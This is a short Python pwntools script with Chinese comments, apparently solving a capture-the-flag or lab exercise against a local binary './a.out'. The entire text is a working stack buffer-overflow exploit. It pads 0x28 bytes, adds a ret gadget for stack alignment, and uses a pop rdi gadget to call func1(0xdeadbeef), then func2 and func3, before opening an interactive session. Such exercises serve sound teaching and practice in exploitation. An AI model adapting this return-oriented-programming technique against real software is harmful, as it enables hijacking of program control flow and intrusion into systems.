from pwn import *

context.arch = "amd64"
p = process("./a.out")
elf = ELF("./a.out")

# 找到必要的gadget
ret_gadget = 0x40053e          # ROPgadget --binary ./a.out | grep "ret"
pop_rdi = 0x4007c3             # ROPgadget --binary ./a.out | grep "pop rdi"

func1 = elf.sym["func1"]
func2 = elf.sym["func2"]
func3 = elf.sym["func3"]

# 构造ROP链（对齐栈 + 传递参数）
payload = b"A" * 0x28
payload += p64(ret_gadget)      # 对齐栈
payload += p64(pop_rdi) + p64(0xdeadbeef) + p64(func1)  # 调用func1(0xdeadbeef)
payload += p64(func2)
payload += p64(func3)

p.sendline(payload)
p.interactive()